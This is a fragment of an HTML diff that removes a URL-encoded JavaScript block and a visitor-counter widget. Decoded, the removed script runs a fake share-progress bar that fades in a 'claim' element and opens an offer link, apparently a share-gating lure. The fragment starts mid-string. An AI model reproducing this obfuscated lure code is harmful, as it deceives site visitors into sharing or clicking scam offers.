%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
-    </script>
-
-    <!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1737721,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
-
-
-
-    <script>
-        /*<![CDATA[*/ cookieChoices = {}; /*]]>*/
-    
 </body>
-
 </html>
